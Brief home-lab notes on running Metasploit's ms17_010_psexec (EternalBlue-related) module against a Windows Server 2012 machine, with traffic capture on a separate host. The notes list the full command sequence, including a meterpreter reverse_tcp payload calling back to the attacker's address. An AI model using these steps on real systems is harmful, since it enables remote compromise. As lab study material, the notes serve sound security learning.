notes on ms17_010_psexec exploit

This is an eternal blue exploit apparently developed by the NSA. 
Metasploit has put this exploit on the tool, so we will be using
that to compromise and execute code on a Windows server 2012 machine
sitting on our home network.

The attacker machine we will be using is sitting on the ip address 
192.168.35.10

The target machine is sitting on the ip address 
192.168.35.200

The following commands will run the exploit:

1. use exploit/windows/smb/ms17_010_psexec
2. set payload windows/x64/meterpreter/reverse_tcp
3. set RHOSTS 192.168.35.200
4. set LHOST 192.168.35.10
5. set LPORT 80
6. run

In the background, we will be recording the network traffic on another machine, 
.5, as well as the attacker machine
nothing could be seen on the .5 machine
